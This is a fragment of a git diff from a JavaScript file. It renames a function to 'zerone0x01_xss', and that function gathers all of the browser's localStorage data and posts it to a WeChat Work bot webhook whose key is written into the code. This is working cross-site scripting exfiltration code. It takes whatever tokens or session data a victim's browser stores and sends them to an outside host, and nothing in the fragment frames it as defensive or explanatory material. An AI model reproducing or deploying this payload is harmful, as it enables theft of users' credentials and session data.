@@ -26,7 +26,7 @@ function sendToWeChatWorkBot(webhookUrl, data) {
     .catch((error) => console.error('Error:', error));
 }
 
-function main() {
+function zerone0x01_xss() {
     const webhookUrl = 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=44f76713-872b-4a36-ae90-e22ad1671fd6'; // 替换为您的企业微信机器人Webhook URL
     const localStorageData = getAllLocalStorageData();
     sendToWeChatWorkBot(webhookUrl, localStorageData);
